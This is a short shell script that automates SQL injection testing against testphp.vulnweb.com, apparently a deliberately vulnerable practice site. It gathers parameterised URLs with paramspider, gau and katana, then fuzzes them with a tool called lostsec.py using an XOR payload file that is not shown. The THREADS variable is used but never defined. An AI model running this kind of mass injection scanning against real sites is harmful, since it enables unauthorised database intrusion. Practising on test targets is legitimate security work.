SQLI

# Define the payload file and the number of threads
PAYLOAD_FILE="payloads/xor.txt"

# Step 1: Use paramspider to find URLs and clean them
paramspider -d testphp.vulnweb.com -o urls.txt
cat urls.txt | sed 's/FUZZ//g' > final.txt

# Step 2: Run lostsec.py with the cleaned URLs
python3 lostsec.py -l final.txt -p $PAYLOAD_FILE -t $THREADS

# Step 3: Use gau to find URLs and filter
echo testphp.vulnweb.com | gau --mc 200 | urldedupe > urls.txt
cat urls.txt | grep -E ".php|.asp|.aspx|.cfm|.jsp" | grep '=' | sort > output.txt
cat output.txt | sed 's/=.*/=/' > final.txt

# Step 4: Run lostsec.py again with the filtered URLs
python3 lostsec.py -l final.txt -p $PAYLOAD_FILE -t $THREADS

# Step 5: Use katana to find URLs and filter
echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe > output.txt
katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt
cat output.txt | sed 's/=.*/=/' > final.txt
